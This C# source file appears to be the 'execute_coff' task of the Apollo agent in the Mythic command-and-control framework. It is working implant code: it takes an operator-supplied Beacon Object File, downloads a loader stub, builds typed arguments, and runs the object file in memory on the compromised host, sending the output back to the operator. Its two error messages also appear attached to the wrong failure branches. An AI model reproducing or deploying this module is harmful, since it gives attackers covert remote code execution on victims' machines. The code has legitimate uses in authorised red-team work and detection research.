#define COMMAND_NAME_UPPER

#if DEBUG
#define EXECUTE_COFF
#endif

#if EXECUTE_COFF

using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Serializers;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Serialization;
using System.Text;
using RunOF.Internals;

namespace Tasks
{
    public class execute_coff : Tasking
    {
        [DataContract]
        internal struct CoffParameters
        {
            [DataMember(Name = "coff_name")]
            public string CoffName;
            [DataMember(Name = "function_name")]
            public string FunctionName;
            [DataMember(Name = "timeout")]
            public string timeout;
            [DataMember(Name = "coff_arguments")]
            public List<string> CoffArguments;
            [DataMember(Name = "loader_stub_id")]
            public string LoaderStubId;
        }

        public execute_coff(IAgent agent, Task task) : base(agent, task)
        {

        }

        public override void Start()
        {
            TaskResponse resp;

            try
            {
                CoffParameters parameters = _jsonSerializer.Deserialize<CoffParameters>(_data.Parameters);
                if (string.IsNullOrEmpty(parameters.CoffName) ||
                string.IsNullOrEmpty(parameters.FunctionName) ||
                string.IsNullOrEmpty(parameters.timeout))
                {
                    resp = CreateTaskResponse(
                        $"One or more required arguments was not provided.",
                        true,
                        "error");
                }
                else
                {
                    if (_agent.GetFileManager().GetFileFromStore(parameters.CoffName, out byte[] coffBytes))
                    {
                        if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId,
                                out byte[] coffPic))
                        {
                            string[] args;

                            if (parameters.CoffArguments != null)
                            {
                                string arguments = "";
                                foreach (string argument in parameters.CoffArguments)
                                {
                                    if (arguments != "")
                                    {
                                        arguments += " ";
                                    }
                                    char[] trimChars = { '\"', '\'' };
                                    string value = argument.Substring(argument.IndexOf(':') + 1).Trim(trimChars);
                                    string key = argument.Split(':')[0];
                                    switch (key)
                                    {
                                        case "int16":
                                            arguments += "-s:" + value;
                                            break;
                                        case "int32":
                                            arguments += "-i:" + value;
                                            break;
                                        case "string":
                                            arguments += "-z:" + value;
                                            break;
                                        case "wchar":
                                            arguments += "-Z:" + value;
                                            break;
                                        case "base64":
                                            arguments += "-b:" + value;
                                            break;
                                        default:
                                            break;

                                    }
                                }

                                string[] CoffArguments = arguments.Split(' ');

                                args = new string[CoffArguments.Length + 4];
                                args[0] = "-a";
                                args[1] = Convert.ToBase64String(coffPic);
                                args[2] = "-e";
                                args[3] = parameters.FunctionName;

                                Array.Copy(CoffArguments, 0, args, 4, CoffArguments.Length);
                            }
                            else
                            {
                                args = new string[] { "-a", Convert.ToBase64String(coffPic), "-e", parameters.FunctionName };
                            }

                            ParsedArgs ParsedArgs = new ParsedArgs(args);

                            BofRunner br = new BofRunner(ParsedArgs);
                            br.LoadBof();
                            var Result = br.RunBof(uint.Parse(parameters.timeout));
                            resp = CreateTaskResponse(
                                Result.Output,
                                true);
                        }
                        else
                        {
                            resp = CreateTaskResponse($"Failed to run coff", true, "error");
                        }
                    }
                    else
                    {
                        resp = CreateTaskResponse(
                            $"Failed to download coff loader stub (with id: {parameters.LoaderStubId})",
                            true,
                            "error");
                    }
                }
            }

            catch (Exception ex)
            {
                resp = CreateTaskResponse($"Exception: {ex.Message}", true, "error");
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}
#endif